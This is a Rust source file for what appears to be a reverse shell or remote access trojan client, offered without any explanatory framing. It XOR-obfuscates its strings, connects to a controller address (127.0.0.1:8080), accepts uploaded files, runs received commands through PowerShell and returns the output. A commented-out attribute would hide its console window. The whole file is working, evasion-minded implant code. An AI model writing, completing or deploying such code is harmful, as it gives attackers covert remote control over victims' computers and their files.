// #![windows_subsystem = "windows"]

use tokio::net::TcpStream;
use xorcrypt::{e, prepare_encryption};

use crate::models::{download_file, read, substr_exists, write};
mod commands;
mod models;
prepare_encryption!();

#[tokio::main]
async fn main() {
    let addr = e!("127.0.0.1:8080");
    let mut conn = TcpStream::connect(addr).await.unwrap();
    loop {
        match read(&mut conn).await {
            Some(cmd) => {
                if substr_exists(&cmd, e!("::STARTFILE::").as_bytes()).await {
                    download_file(&cmd).await;
                    if write(&mut conn, b"[+] File uploaded successfully".to_vec())
                        .await
                        .is_err()
                    {
                        break;
                    }
                    continue;
                }
                let command = String::from_utf8(cmd.clone()).unwrap();
                if commands::process(&command, &mut conn).await.is_err() {
                    continue;
                };
                match command.as_str() {
                    "exit" => {
                        write(&mut conn, b"::EOF::".to_vec()).await.unwrap();
                        break;
                    }
                    _ => {
                        let output = commands::run_ps(command).await;
                        if write(&mut conn, output).await.is_err() {
                            break;
                        }
                    }
                }
            }
            None => {
                continue;
            }
        }
    }
}
